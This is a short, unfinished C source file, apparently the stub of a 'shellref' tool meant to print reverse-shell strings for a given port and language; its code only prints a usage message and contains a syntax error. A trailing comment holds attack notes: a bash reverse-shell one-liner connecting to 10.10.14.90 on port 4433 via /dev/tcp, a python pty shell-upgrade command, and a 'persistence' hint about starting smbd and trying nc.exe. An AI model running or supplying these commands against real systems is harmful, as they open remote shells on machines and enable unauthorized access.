//Provide port, preferred language. 
//Program will return shellcode strings in requested language

# include <stdio.h>
void usage();


int main (int argc, char *argv[]) {

if (argc > 2 || argc == 0) {
  usage();
}



return 0;
}

void usage(void) {
  printf(
      "Usage:\n"
      "shellref {port} [-l]\n"
      "port: the port you will listen for shell on\n"
      "[-l]anguage: the language of the shellcode str you want\n")
}


/* 
# Reverse Shell --------------------
; bash -c "bash -i >& /dev/tcp/10.10.14.90/4433 0>&1" &



# Shell Upgrade --------------------
python3 -c 'import pty; pty.spawn("/bin/bash")'

Persistance
sudo service smbd start (don't forget to try nc.exe and nc64.exe) */
